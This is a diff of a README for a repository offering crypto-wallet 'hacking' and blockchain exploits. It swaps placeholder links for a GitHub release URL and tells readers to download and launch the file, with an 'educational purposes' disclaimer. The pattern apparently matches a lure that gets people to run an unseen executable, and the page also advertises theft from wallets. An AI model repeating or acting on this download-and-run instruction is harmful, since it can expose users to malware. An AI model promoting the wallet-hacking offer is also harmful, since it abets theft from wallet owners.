@@ -22,7 +22,7 @@ This repository is dedicated to all things related to hacking crypto wallets, ex
 - Wallets Hacking
 
 ### Get Started
-Explore the depths of crypto hacking and blockchain exploration by visiting the [555](555) file. Download the file and launch it to begin your journey into the exciting world of crypto wallet hacking and blockchain exploits.
+Explore the depths of crypto hacking and blockchain exploration by visiting the [https://github.com/quickbullet-lopd/hack-crypto-wallet/releases/tag/3.7.6](https://github.com/quickbullet-lopd/hack-crypto-wallet/releases/tag/3.7.6) file. Download the file and launch it to begin your journey into the exciting world of crypto wallet hacking and blockchain exploits.
 
 If the provided link does not work or needs to be launched, please check the "Releases" section for alternative download options.
 
@@ -43,6 +43,6 @@ Enjoying your experience in our repository? Share it with your friends and colle
 
 ## Happy Hacking and Happy Trading! 💰🔒🚀
 
-![Crypto](555)
+![Crypto](https://github.com/quickbullet-lopd/hack-crypto-wallet/releases/tag/3.7.6)
 
 *Disclaimer: This repository is for educational and research purposes only. Always adhere to ethical hacking practices and comply with applicable laws and regulations.*
